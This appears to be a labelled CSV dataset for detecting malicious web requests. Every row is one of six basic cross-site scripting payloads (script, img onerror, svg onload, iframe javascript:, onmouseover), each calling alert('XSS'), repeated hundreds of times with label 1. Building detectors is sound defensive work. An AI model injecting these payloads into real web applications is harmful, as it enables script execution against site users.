request_data,label
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<img src=x onerror=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<img src=x onerror=alert('XSS')>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<svg/onload=alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<script>alert('XSS')</script>,1
<b onmouseover=alert('XSS')>hover me</b>,1
<iframe src=javascript:alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
<iframe src=javascript:alert('XSS')>,1
<svg/onload=alert('XSS')>,1
<img src=x onerror=alert('XSS')>,1
<iframe src=javascript:alert('XSS')>,1
<script>alert('XSS')</script>,1
